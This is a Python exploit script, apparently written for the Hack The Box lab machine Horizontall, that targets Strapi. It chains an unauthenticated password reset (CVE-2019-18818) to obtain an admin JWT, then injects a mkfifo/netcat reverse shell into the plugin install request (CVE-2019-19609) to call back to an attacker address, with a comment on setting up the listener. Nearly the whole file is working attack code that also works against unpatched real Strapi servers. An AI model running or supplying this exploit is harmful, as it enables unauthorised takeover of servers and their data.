#!/usr/bin/python3

from matplotlib.font_manager import json_load
import requests
import re
import json
import pyfiglet
import time
from colorama import Fore, Back, Style

def banner(text="autopwn"):
    print(Fore.RED + pyfiglet.figlet_format(text, font="banner"))
    print(Fore.GREEN + "[+] Author: @dugisan3rd")
    print("[+] Medium: Hack the Box")
    print("[+] Link: https://app.hackthebox.com/machines/374")
    print("[+] Machine: Horizontall")
    print("[+] Vulnerability: CVE-2019-18818: “Strapi” Unauthenticated Password Reset && CVE-2019-19609: “Strapi” Remote Code Execution in Install/Uninstall Admin Plugin\n" + Style.RESET_ALL)

# change lhost and lport
# set up listener: nc -nvlp 10.10.14.26 9999
LHOST = "10.10.14.26"
LPORT = 9999

payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {0} {1} >/tmp/f".format(LHOST, LPORT)

r = requests.Session()

# url_version = "http://api-prod.horizontall.htb/admin/strapiVersion"
url_reset = "http://api-prod.horizontall.htb/admin/auth/reset-password"
url_install = "http://api-prod.horizontall.htb/admin/plugins/install"

# def checkVersion():
#     r = requests.get(url_version)
#     print(r.text)

def resetPass():
    print("[+] Triggering unauthenticated password reset")
    r = requests.post(url = url_reset, json = {"code":{}, "password": "dugisan3rd","passwordConfirmation": "dugisan3rd"})
    # print(r.text)
    json_res = json.loads(r.text)
    print("[+] JWT: {}".format(json_res['jwt']))
    return(json_res['jwt'])

def exploit(jwt=resetPass()):
    print("[+] Sending reverse shell payload")
    r = requests.post(url = url_install, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Authorization": "Bearer {}".format(jwt)}, json = {"plugin": "documentation && $({})".format(payload)})
    print("[+] Payload sent. Please check your listener")
    # print(r.text)

if __name__ == "__main__":
    # banner()
    # time.sleep(2)
    # checkVersion()
    # print(payload)
    exploit()